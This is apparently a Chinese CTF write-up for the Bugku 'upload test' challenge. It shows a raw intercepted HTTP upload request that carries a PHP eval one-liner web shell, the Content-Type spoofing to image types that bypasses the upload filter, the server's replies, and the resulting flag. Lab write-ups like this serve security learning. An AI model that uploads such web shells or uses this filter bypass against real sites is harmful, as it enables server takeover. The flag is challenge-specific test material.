# 上传测试

## 题目

> http://ctf.bugku.com/challenges#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95
>
> <http://103.238.227.13:10085/>
>
> Flag格式：Flag:xxxxxxxxxxxxx


## 解答思路
- 上传漏洞需要检测的两个字段

  1. content-type 

     依次测试各种常用的图片格式

  2. filename 

     修改filename的后缀名为图片格式

  

## 流程图

## 解题步骤

1. 上传php一句话，bp拦截

   ```http
   POST / HTTP/1.1
   Host: 103.238.227.13:10085
   Proxy-Connection: keep-alive
   Content-Length: 225
   Cache-Control: max-age=0
   Origin: http://103.238.227.13:10085
   Upgrade-Insecure-Requests: 1
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2BXYLDylhw7Io7Jh
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
   Referer: http://103.238.227.13:10085/
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
   
   ------WebKitFormBoundary2BXYLDylhw7Io7Jh
   Content-Disposition: form-data; name="file"; filename="php.php"
   Content-Type: application/octet-stream
   
   <?php @eval($_POST[123456]);?>
   ------WebKitFormBoundary2BXYLDylhw7Io7Jh--
   ```

2. 修改`Content-Type: application/octet-stream`为`Content-Type: image:jpg`

   回复：

   ```http
   HTTP/1.1 200 OK
   Server: nginx
   Date: Fri, 20 Jul 2018 01:57:17 GMT
   Content-Type: text/html; charset=utf-8
   Connection: keep-alive
   Vary: Accept-Encoding
   X-Powered-By: PHP/7.0.7
   Content-Length: 15
   
   非图片文件
   ```

3. 修改`Content-Type: application/octet-stream`为`Content-Type: image:gif`

   返回：

   `Flag:42e97d465f962c53df9549377b513c7e`


## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5` 
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

